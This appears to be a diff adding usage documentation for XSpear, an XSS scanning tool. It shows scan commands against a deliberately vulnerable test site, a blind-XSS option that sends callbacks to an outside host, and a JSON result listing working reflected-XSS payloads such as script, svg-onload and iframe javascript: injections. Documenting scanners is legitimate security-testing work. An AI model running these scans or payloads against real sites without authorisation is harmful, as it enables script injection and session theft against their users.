@@ -1,0 +1,58 @@
+# Verbose Mode
+# [0] quite mode(show only result)
+$ XSpear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 0
+
+# [1] show progress bar (default)
+$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 1
+
+# [2] show scanning logs
+$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 2
+
+# [3] show scanning detail logs
+$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 3
+
+Case by Case
+Scanning XSS
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy"
+Only JSON output
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy" -o json -v 0
+Set scanning thread
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -t 30
+Testing at selected parameters
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" -p cat,test
+Testing at all parameters
+(This option is tested with or without reflection.)
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" -a
+Testing Only parameter analysis (aka no-xss mode)
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" --no-xss
+Testing blind xss(all params)
+(Should be used as much as possible because Blind XSS is everywhere)
+
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -b "https://hahwul.xss.ht" -a
+
+# Set your blind xss host. <-b options>
+# Testing custom payload
+
+$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" --custom-payload=custom_payload.json 
+
+# for Pipeline
+$ $ xspear -u {target} -b "your-blind-xss-host" -a -v 0 -o json
+
+# -u : target 
+# -b : testing blind xss
+# -a : test all params(test to not reflected param)
+# -v : verbose, not showing logs at value 1.
+# -o : output optios, json!
+
+# to JSON
+$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fffff" -v 1 -o json
+{"starttime":"2019-08-14 23:58:12 +0900","endtime":"2019-08-14 23:58:44 +0900","issue_count":24,"issue_list":[{"id":0,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Found Server: nginx/1.4.1"},{"id":1,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not set HSTS"},{"id":2,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Content-Type: text/html"},{"id":3,"type":"LOW","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set X-Frame-Options"},{"id":4,"type":"MIDUM","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set CSP"},{"id":5,"type":"INFO","issue":"DYNAMIC ANALYSIS","method":"GET","param":"cat","payload":"XsPeaR\"","description":"Found SQL Error Pattern"},{"id":6,"type":"INFO","issue":"REFLECTED","method":"GET","param":"cat","payload":"rEfe6","description":"reflected parameter"},{"id":7,"type":"INFO","issue":"FILERD RULE","method":"GET","param":"cat","payload":"onhwul=64","description":"not filtered event handler on{any} pattern"},{"id":8,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"reflected XSS Code"},{"id":9,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<textarea autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":10,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<video/poster/onerror=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":11,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":12,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert`45`\">","description":"reflected HTML5 XSS Code"},{"id":13,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<select autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":14,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":15,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<input autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":16,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"\"><iframe/src=JavaScriPt:alert(45)>","description":"reflected XSS Code"},{"id":17,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<meter onmouseover=alert(45)>0</meter>","description":"reflected HTML5 XSS Code"},{"id":18,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<keygen autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":19,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"triggered <audio src onloadstart=alert(45)>"},{"id":20,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"triggered <marquee onstart=alert(45)>"},{"id":21,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert(45)\">","description":"triggered <details/open/ontoggle=\"alert(45)\">"},{"id":22,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"triggered <script>alert(45)</script>"},{"id":23,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"'\"><svg/onload=alert(45)>","description":"triggered <svg/onload=alert(45)>"}]}
+
+
+
